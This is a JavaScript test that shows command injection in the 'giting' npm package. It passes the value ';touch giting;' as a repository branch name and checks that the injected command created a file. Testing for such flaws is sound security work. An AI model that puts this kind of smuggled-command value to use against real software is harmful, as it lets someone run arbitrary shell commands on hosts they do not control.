test("Command Injection in giting", (done) => {
  expect.assertions(2);
  const Test = require("giting");
  const fs = require("fs");
  const path = "./giting";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let injection_command = ";touch giting;";
  test = new Test({ workDir: "./" });
  repo = {
    organization: "./",
    name: "./",
    branch: injection_command,
  };
  test.pull(repo, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
